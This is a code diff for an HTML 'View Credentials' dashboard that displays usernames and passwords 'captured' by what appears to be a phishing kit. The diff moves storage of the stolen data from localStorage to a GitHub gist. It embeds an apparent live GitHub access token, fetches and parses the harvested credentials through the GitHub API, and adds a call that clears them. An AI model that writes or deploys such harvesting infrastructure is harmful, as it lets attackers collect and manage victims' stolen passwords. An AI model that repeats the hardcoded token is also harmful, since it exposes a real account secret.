@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>View Credentials (Local Storage Version)</title>
+    <title>View Credentials</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -53,6 +53,19 @@
         .refresh-btn:hover {
             background-color: #45a049;
         }
+        .loading {
+            text-align: center;
+            color: #666;
+            padding: 20px;
+        }
+        .error-message {
+            color: #d9534f;
+            background-color: #f9f2f4;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 10px 0;
+            border: 1px solid #d9534f;
+        }
         .header-actions {
             display: flex;
             justify-content: space-between;
@@ -74,14 +87,6 @@
         .clear-btn:hover {
             background-color: #c9302c;
         }
-        .error-message {
-            color: #d9534f;
-            background-color: #f9f2f4;
-            padding: 15px;
-            border-radius: 4px;
-            margin: 10px 0;
-            border: 1px solid #d9534f;
-        }
     </style>
 </head>
 <body>
@@ -99,6 +104,10 @@
 </div>
 
 <script>
+    // Configuration - replace with your actual values
+    const githubToken = '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';
+    const gistId = '68e118158461ea3a255171d3579a196f';
+    
     // Load credentials when the page loads
     window.onload = function() {
         loadCredentials();
@@ -107,15 +116,31 @@
     function loadCredentials() {
         const container = document.getElementById('credentials');
         const countElement = document.getElementById('credentialCount');
+        container.innerHTML = '<div class="loading">Loading credentials...</div>';
+        countElement.textContent = 'Loading...';
         
-        try {
-            // Get credentials from localStorage
-            let credentials = JSON.parse(localStorage.getItem('credentials') || '[]');
+        fetch(`https://api.github.com/gists/${gistId}`, {
+            headers: {
+                'Authorization': `token ${githubToken}`
+            }
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP error! Status: ${response.status}`);
+            }
+            return response.json();
+        })
+        .then(data => {
+            const content = data.files['credentials.txt'].content;
+            const lines = content.split('\n');
+            
+            // Filter out empty lines
+            const credentialLines = lines.filter(line => line.trim() !== '');
             
             // Update count
-            countElement.textContent = `${credentials.length} credential(s) captured`;
+            countElement.textContent = `${credentialLines.length} credential(s) captured`;
             
-            if (credentials.length === 0) {
+            if (credentialLines.length === 0) {
                 container.innerHTML = '<div class="no-credentials">No credentials captured yet.</div>';
                 return;
             }
@@ -123,38 +148,81 @@
             container.innerHTML = '';
             
             // Display each credential in reverse order (newest first)
-            credentials.reverse().forEach((cred, index) => {
+            credentialLines.reverse().forEach((line, index) => {
                 const credential = document.createElement('div');
                 credential.className = 'credential';
                 
+                // Parse the line (format: "Username: xxx, Password: xxx, Time: xxx")
+                const parts = line.split(', ');
+                let username = 'N/A';
+                let password = 'N/A';
+                let timestamp = 'N/A';
+                
+                parts.forEach(part => {
+                    if (part.startsWith('Username: ')) {
+                        username = part.substring(10);
+                    } else if (part.startsWith('Password: ')) {
+                        password = part.substring(10);
+                    } else if (part.startsWith('Time: ')) {
+                        timestamp = part.substring(6);
+                    }
+                });
+                
                 // Format the timestamp for better readability
-                let formattedTime = cred.timestamp;
+                let formattedTime = timestamp;
                 try {
-                    const date = new Date(cred.timestamp);
+                    const date = new Date(timestamp);
                     formattedTime = date.toLocaleString();
                 } catch (e) {
                     // Keep original if parsing fails
                 }
                 
                 credential.innerHTML = `
-                    <p><strong>Username:</strong> ${cred.username}</p>
-                    <p><strong>Password:</strong> ${cred.password}</p>
+                    <p><strong>Username:</strong> ${username}</p>
+                    <p><strong>Password:</strong> ${password}</p>
                     <p><strong>Time:</strong> ${formattedTime}</p>
                 `;
                 
                 container.appendChild(credential);
             });
-        } catch (error) {
+        })
+        .catch(error => {
             console.error('Error loading credentials:', error);
             container.innerHTML = `<div class="error-message">Error loading credentials: ${error.message}</div>`;
             countElement.textContent = 'Error';
-        }
+        });
     }
     
     function clearCredentials() {
         if (confirm('Are you sure you want to clear all credentials? This action cannot be undone.')) {
-            localStorage.removeItem('credentials');
-            loadCredentials();
+            fetch(`https://api.github.com/gists/${gistId}`, {
+                method: 'PATCH',
+                headers: {
+                    'Authorization': `token ${githubToken}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    files: {
+                        'credentials.txt': {
+                            content: ''
+                        }
+                    }
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Credentials cleared');
+                loadCredentials(); // Refresh the view
+            })
+            .catch(error => {
+                console.error('Error clearing credentials:', error);
+                alert(`Error clearing credentials: ${error.message}`);
+            });
         }
     }
 </script>
